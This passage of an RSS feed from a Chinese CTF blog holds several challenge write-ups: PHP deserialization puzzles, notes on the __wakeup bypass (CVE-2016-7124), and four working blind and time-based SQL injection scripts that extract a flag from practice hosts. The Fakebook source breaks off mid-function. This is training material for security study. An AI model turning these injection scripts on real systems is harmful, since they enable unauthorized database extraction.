</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="s1">&#39;guest_img.png&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img_path&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$serialize_info</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;highlight_file&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;phpinfo&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">);</span> <span class="c1">//maybe you can find something in here!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;show_image&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$userinfo</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$serialize_info</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$userinfo</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>审计一下，提取一下代码主体</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$function</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$function</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;highlight_file&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;phpinfo&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">);</span> <span class="c1">//maybe you can find something in here!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$function</span> <span class="o">==</span> <span class="s1">&#39;show_image&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$userinfo</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$serialize_info</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$userinfo</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">]));</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>$function</code>的值默认为<code>highlight_file</code></p>
        
        <hr><p>本文2025-07-13首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-13</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>Serialize_01</title>
      <link>https://www.lier.xin/post/serialize_01/</link>
      <pubDate>Tue, 08 Jul 2025 15:01:28 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/serialize_01/</guid>
      <description>
        <![CDATA[<h1>Serialize_01</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <p><a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化 | 晨曦的个人小站</a></p>
<p><a href="https://blog.csdn.net/m0_73512445/article/details/132513838">反序列化中_wakeup的绕过_wakeup绕过-CSDN博客</a></p>
<p><a href="https://ethe448.github.io/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/">从一道ctf题看php原生类 | Ethe&rsquo;s blog</a></p>
<h2 id="__wakeup绕过">
<a class="header-anchor" href="#__wakeup%e7%bb%95%e8%bf%87"></a>
<code>__wakeup</code>绕过
</h2><h3 id="cve-2016-7124">
<a class="header-anchor" href="#cve-2016-7124"></a>
<code>cve-2016-7124</code>
</h3><p>影响范围：</p>
<ul>
<li>PHP5 &lt; 5.6.25</li>
<li>PHP7 &lt; 7.0.10</li>
</ul>
<p>正常来说在反序列化过程中，会先调用 <code>__wakeup()</code> 方法再进行 <code>unserilize</code> 的操作，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，<code>__wakeup()</code>的执行会被跳过。</p>
        
        <hr><p>本文2025-07-08首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-08</p>]]>
      </description>
      
        <category>Learning</category>
      
    </item>
    
    

    <item>
      <title>Litctf2025-君の名は</title>
      <link>https://www.lier.xin/post/litctf2025-%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF/</link>
      <pubDate>Tue, 08 Jul 2025 14:49:15 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/litctf2025-%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF/</guid>
      <description>
        <![CDATA[<h1>Litctf2025-君の名は</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(`/readflag`);&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Taki</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$musubi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$magic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;musubi&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">new</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Mitsuha</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$memory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">KatawareDoki</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$soul</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$kuchikamizake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">soul</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">flag</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">kuchikamizake</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;call error!no flag!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Litctf2025</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Litctf2025&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^[Oa]:[\d]+/i&#34;</span><span class="p">,</span> <span class="nv">$Litctf2025</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$Litctf2025</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>首先分析攻击点</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(`/readflag`);&#39;</span><span class="p">);</span>
</span></span></code></pre></div><p>这里<code>create_function</code>构造了一个匿名函数，执行该函数即可拿到flag
思路就清晰了
1、拿到匿名函数的函数名
2、执行该函数</p>
        
        <hr><p>本文2025-07-08首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-08</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>CISCN2019 华北赛区 Day2 Web1Hack_World</title>
      <link>https://www.lier.xin/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/</link>
      <pubDate>Tue, 01 Jul 2025 14:25:19 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/</guid>
      <description>
        <![CDATA[<h1>CISCN2019 华北赛区 Day2 Web1Hack_World</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <p>题目很简单，主要是练习一下脚本，做下记录方便查阅</p>
<h2 id="exp">
<a class="header-anchor" href="#exp"></a>
exp
</h2><h3 id="枚举法">
<a class="header-anchor" href="#%e6%9e%9a%e4%b8%be%e6%b3%95"></a>
枚举法
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="s2">&#34;if(substr((select(flag)from(flag)),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;,1,0)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">j</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span></code></pre></div><h3 id="二分法">
<a class="header-anchor" href="#%e4%ba%8c%e5%88%86%e6%b3%95"></a>
二分法
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># select=&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,0)&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="时间盲注">
<a class="header-anchor" href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8"></a>
时间盲注
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)=&#39;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;,sleep(2),0)&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">j</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span></code></pre></div><h3 id="时间二分法">
<a class="header-anchor" href="#%e6%97%b6%e9%97%b4%e4%ba%8c%e5%88%86%e6%b3%95"></a>
时间二分法
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,0,sleep(2))&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div>
        
        <hr><p>本文2025-07-01首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-01</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>网鼎杯 2018 Fakebook</title>
      <link>https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/</link>
      <pubDate>Tue, 01 Jul 2025 14:19:27 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/</guid>
      <description>
        <![CDATA[<h1>网鼎杯 2018 Fakebook</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><p><code>robots.txt</code>给出题目源码，访问下载，后缀去掉<code>.bak</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630173513577.png" alt="image-20250630173513482"></p>
<h3 id="题目源码">
<a class="header-anchor" href="#%e9%a2%98%e7%9b%ae%e6%ba%90%e7%a0%81"></a>
题目源码
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span> <span class="o">=</span> <span class="nv">$blog</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
